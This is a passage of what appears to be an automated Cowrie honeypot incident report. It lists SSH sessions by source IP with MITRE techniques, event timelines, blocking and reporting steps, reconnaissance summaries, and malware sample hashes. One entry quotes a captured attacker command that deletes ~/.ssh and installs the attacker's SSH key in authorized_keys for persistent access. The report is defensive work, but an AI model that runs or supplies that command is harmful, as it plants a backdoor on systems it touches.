| `2026-08-24 02:32:29` | `cowrie.client.version` |
| `2026-08-24 02:32:29` | `cowrie.client.kex` |
| `2026-08-24 02:32:30` | `cowrie.login.success` |
| `2026-08-24 02:32:31` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:32:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.117.127[.]141` to AbuseIPDB if not already reported
- [ ] Block `93.117.127[.]141` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cbd2f4cd238

| Field | Detail |
|---|---|
| **Source IP** | `208.109.38[.]143` |
| **First Seen** | 2026-08-24 02:32 |
| **Last Seen** | 2026-08-24 02:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:32:36` | `cowrie.session.connect` |
| `2026-08-24 02:32:36` | `cowrie.client.version` |
| `2026-08-24 02:32:36` | `cowrie.client.kex` |
| `2026-08-24 02:32:37` | `cowrie.login.success` |
| `2026-08-24 02:32:38` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:32:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `208.109.38[.]143` to AbuseIPDB if not already reported
- [ ] Block `208.109.38[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bdfff89867d

| Field | Detail |
|---|---|
| **Source IP** | `36.93.154[.]207` |
| **First Seen** | 2026-08-24 02:35 |
| **Last Seen** | 2026-08-24 02:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:35:21` | `cowrie.session.connect` |
| `2026-08-24 02:35:22` | `cowrie.client.version` |
| `2026-08-24 02:35:22` | `cowrie.client.kex` |
| `2026-08-24 02:35:25` | `cowrie.login.success` |
| `2026-08-24 02:35:25` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:35:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.154[.]207` to AbuseIPDB if not already reported
- [ ] Block `36.93.154[.]207` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-165a30c8a6bb

| Field | Detail |
|---|---|
| **Source IP** | `47.247.73[.]99` |
| **First Seen** | 2026-08-24 02:35 |
| **Last Seen** | 2026-08-24 02:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:35:31` | `cowrie.session.connect` |
| `2026-08-24 02:35:32` | `cowrie.client.version` |
| `2026-08-24 02:35:32` | `cowrie.client.kex` |
| `2026-08-24 02:35:34` | `cowrie.login.success` |
| `2026-08-24 02:35:34` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:35:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.247.73[.]99` to AbuseIPDB if not already reported
- [ ] Block `47.247.73[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b66f3397579

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 02:37 |
| **Last Seen** | 2026-08-24 02:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:37:36` | `cowrie.session.connect` |
| `2026-08-24 02:37:36` | `cowrie.client.version` |
| `2026-08-24 02:37:37` | `cowrie.client.kex` |
| `2026-08-24 02:37:37` | `cowrie.login.success` |
| `2026-08-24 02:37:38` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:37:38` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 02:37:38` | `cowrie.direct-tcpip.data` |
| `2026-08-24 02:37:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11e0a1001505

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 02:37 |
| **Last Seen** | 2026-08-24 02:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:37:40` | `cowrie.session.connect` |
| `2026-08-24 02:37:40` | `cowrie.client.version` |
| `2026-08-24 02:37:41` | `cowrie.client.kex` |
| `2026-08-24 02:37:41` | `cowrie.login.success` |
| `2026-08-24 02:37:42` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:37:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 02:37:42` | `cowrie.direct-tcpip.data` |
| `2026-08-24 02:37:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5715a1a979d

| Field | Detail |
|---|---|
| **Source IP** | `64.181.172[.]46` |
| **First Seen** | 2026-08-24 02:40 |
| **Last Seen** | 2026-08-24 02:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:40:02` | `cowrie.session.connect` |
| `2026-08-24 02:40:03` | `cowrie.client.version` |
| `2026-08-24 02:40:03` | `cowrie.client.kex` |
| `2026-08-24 02:40:05` | `cowrie.login.success` |
| `2026-08-24 02:40:06` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:40:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.181.172[.]46` to AbuseIPDB if not already reported
- [ ] Block `64.181.172[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-691b39e9b0bf

| Field | Detail |
|---|---|
| **Source IP** | `182.75.234[.]236` |
| **First Seen** | 2026-08-24 02:44 |
| **Last Seen** | 2026-08-24 02:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:44:06` | `cowrie.session.connect` |
| `2026-08-24 02:44:06` | `cowrie.client.version` |
| `2026-08-24 02:44:06` | `cowrie.client.kex` |
| `2026-08-24 02:44:08` | `cowrie.login.success` |
| `2026-08-24 02:44:09` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:44:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.234[.]236` to AbuseIPDB if not already reported
- [ ] Block `182.75.234[.]236` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e442df2794d

| Field | Detail |
|---|---|
| **Source IP** | `58.57.154[.]146` |
| **First Seen** | 2026-08-24 02:44 |
| **Last Seen** | 2026-08-24 02:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:44:24` | `cowrie.session.connect` |
| `2026-08-24 02:44:24` | `cowrie.client.version` |
| `2026-08-24 02:44:24` | `cowrie.client.kex` |
| `2026-08-24 02:44:26` | `cowrie.login.success` |
| `2026-08-24 02:44:27` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:44:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.57.154[.]146` to AbuseIPDB if not already reported
- [ ] Block `58.57.154[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6e48285bce7

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 02:47 |
| **Last Seen** | 2026-08-24 02:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:47:09` | `cowrie.session.connect` |
| `2026-08-24 02:47:09` | `cowrie.client.version` |
| `2026-08-24 02:47:09` | `cowrie.client.kex` |
| `2026-08-24 02:47:10` | `cowrie.login.success` |
| `2026-08-24 02:47:10` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:47:11` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 02:47:11` | `cowrie.direct-tcpip.data` |
| `2026-08-24 02:47:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5eb875aafba3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 02:47 |
| **Last Seen** | 2026-08-24 02:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:47:13` | `cowrie.session.connect` |
| `2026-08-24 02:47:13` | `cowrie.client.version` |
| `2026-08-24 02:47:13` | `cowrie.client.kex` |
| `2026-08-24 02:47:14` | `cowrie.login.success` |
| `2026-08-24 02:47:14` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:47:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 02:47:14` | `cowrie.direct-tcpip.data` |
| `2026-08-24 02:47:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5801123f6b0a

| Field | Detail |
|---|---|
| **Source IP** | `36.93.154[.]207` |
| **First Seen** | 2026-08-24 02:49 |
| **Last Seen** | 2026-08-24 02:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:49:10` | `cowrie.session.connect` |
| `2026-08-24 02:49:11` | `cowrie.client.version` |
| `2026-08-24 02:49:11` | `cowrie.client.kex` |
| `2026-08-24 02:49:13` | `cowrie.login.success` |
| `2026-08-24 02:49:14` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:49:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.154[.]207` to AbuseIPDB if not already reported
- [ ] Block `36.93.154[.]207` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-593991f4c31e

| Field | Detail |
|---|---|
| **Source IP** | `92.84.21[.]186` |
| **First Seen** | 2026-08-24 02:49 |
| **Last Seen** | 2026-08-24 02:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:49:23` | `cowrie.session.connect` |
| `2026-08-24 02:49:23` | `cowrie.client.version` |
| `2026-08-24 02:49:23` | `cowrie.client.kex` |
| `2026-08-24 02:49:24` | `cowrie.login.success` |
| `2026-08-24 02:49:25` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:49:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.84.21[.]186` to AbuseIPDB if not already reported
- [ ] Block `92.84.21[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f1c3b8e26f9

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-24 02:53 |
| **Last Seen** | 2026-08-24 02:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:53:26` | `cowrie.session.connect` |
| `2026-08-24 02:53:26` | `cowrie.client.version` |
| `2026-08-24 02:53:26` | `cowrie.client.kex` |
| `2026-08-24 02:53:27` | `cowrie.login.success` |
| `2026-08-24 02:53:27` | `cowrie.direct-tcpip.request` |
| `2026-08-24 02:53:27` | `cowrie.direct-tcpip.data` |
| `2026-08-24 02:53:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d3a8d033f37

| Field | Detail |
|---|---|
| **Source IP** | `20.96.179[.]87` |
| **First Seen** | 2026-08-24 02:53 |
| **Last Seen** | 2026-08-24 02:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:53:56` | `cowrie.session.connect` |
| `2026-08-24 02:53:56` | `cowrie.client.version` |
| `2026-08-24 02:53:56` | `cowrie.client.kex` |
| `2026-08-24 02:53:56` | `cowrie.login.success` |
| `2026-08-24 02:53:57` | `cowrie.session.params` |
| `2026-08-24 02:53:57` | `cowrie.command.input` |
| `2026-08-24 02:53:57` | `cowrie.command.failed` |
| `2026-08-24 02:53:57` | `cowrie.log.closed` |
| `2026-08-24 02:53:57` | `cowrie.session.params` |
| `2026-08-24 02:53:57` | `cowrie.command.input` |
| `2026-08-24 02:53:57` | `cowrie.session.file_download` |
| `2026-08-24 02:53:57` | `cowrie.log.closed` |
| `2026-08-24 02:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.96.179[.]87` to AbuseIPDB if not already reported
- [ ] Block `20.96.179[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7eda75dee5d8

| Field | Detail |
|---|---|
| **Source IP** | `20.96.179[.]87` |
| **First Seen** | 2026-08-24 02:53 |
| **Last Seen** | 2026-08-24 02:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:53:57` | `cowrie.session.connect` |
| `2026-08-24 02:53:57` | `cowrie.client.version` |
| `2026-08-24 02:53:57` | `cowrie.client.kex` |
| `2026-08-24 02:53:57` | `cowrie.login.success` |
| `2026-08-24 02:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.96.179[.]87` to AbuseIPDB if not already reported
- [ ] Block `20.96.179[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c791d6f2cd3

| Field | Detail |
|---|---|
| **Source IP** | `20.96.179[.]87` |
| **First Seen** | 2026-08-24 02:53 |
| **Last Seen** | 2026-08-24 02:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 02:53:57` | `cowrie.session.connect` |
| `2026-08-24 02:53:57` | `cowrie.client.version` |
| `2026-08-24 02:53:57` | `cowrie.client.kex` |
| `2026-08-24 02:53:57` | `cowrie.login.success` |
| `2026-08-24 02:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.96.179[.]87` to AbuseIPDB if not already reported
- [ ] Block `20.96.179[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `134.209.229[.]23` | **30** | 2026-08-24 00:57 | 2026-08-24 02:44 | 27m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-08-24 01:11 | 2026-08-24 02:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `213.14.19[.]182` | **4** | 2026-08-24 01:45 | 2026-08-24 01:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]48` | **3** | 2026-08-24 02:36 | 2026-08-24 02:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `8.134.157[.]132` | **3** | 2026-08-24 01:47 | 2026-08-24 01:50 | 4m | 0 | `T1592` | 🟢 LOW |
| `143.0.66[.]172` | **2** | 2026-08-24 00:58 | 2026-08-24 00:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | **2** | 2026-08-24 01:26 | 2026-08-24 01:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `85.24.246[.]216` | **2** | 2026-08-24 01:07 | 2026-08-24 02:46 | 4m | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]153` | **2** | 2026-08-24 01:12 | 2026-08-24 01:25 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.66.63[.]186` | 1 | 2026-08-24 01:45 | 2026-08-24 01:45 | 8s | 0 | `T1592` | 🟢 LOW |
| `193.30.243[.]203` | 1 | 2026-08-24 02:19 | 2026-08-24 02:19 | 15s | 0 | `T1592` | 🟢 LOW |
| `213.66.196[.]11` | 1 | 2026-08-24 02:40 | 2026-08-24 02:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]252` | 1 | 2026-08-24 01:45 | 2026-08-24 01:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.59.88[.]179` | 1 | 2026-08-24 01:40 | 2026-08-24 01:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `46.59.88[.]245` | 1 | 2026-08-24 02:44 | 2026-08-24 02:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `46.59.91[.]172` | 1 | 2026-08-24 00:59 | 2026-08-24 01:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.124.150[.]248` | 1 | 2026-08-24 01:28 | 2026-08-24 01:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]14` | 1 | 2026-08-24 01:45 | 2026-08-24 01:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `54.221.141[.]122` | 1 | 2026-08-24 01:12 | 2026-08-24 01:12 | 1s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]242` | 1 | 2026-08-24 01:02 | 2026-08-24 01:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]142` | 1 | 2026-08-24 01:49 | 2026-08-24 01:49 | 15s | 0 | `T1592` | 🟢 LOW |
| `69.114.218[.]229` | 1 | 2026-08-24 01:41 | 2026-08-24 01:41 | 11s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]245` | 1 | 2026-08-24 01:45 | 2026-08-24 01:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]74` | 1 | 2026-08-24 02:42 | 2026-08-24 02:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.68.69[.]14` | 1 | 2026-08-24 01:45 | 2026-08-24 01:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `89.248.172[.]11` | 1 | 2026-08-24 01:38 | 2026-08-24 01:39 | 31s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
